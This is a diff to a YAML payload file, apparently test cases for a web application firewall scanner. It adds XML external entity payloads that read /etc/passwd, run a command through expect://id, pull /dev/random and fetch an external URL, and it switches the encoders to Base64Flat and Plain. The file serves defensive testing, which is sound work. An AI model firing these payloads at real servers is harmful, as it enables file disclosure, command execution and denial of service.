@@ -1,9 +1,17 @@
 payload:
   - '<!DOCTYPE x SYSTEM "//x/x" > <x>a</x>'
   - '<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>'
+  - '<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://host/text.txt" > ] > <foo>&xxe;</foo>'
+  - '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id">]>'
+  - '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "file:///dev/random">] > <foo>&xxe;</foo>'
+  - !!str |
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
 encoder:
-  - Base64
-  - Url
+  - Base64Flat
+  - Plain
 placeholder:
-  - UrlParam
   - RequestBody
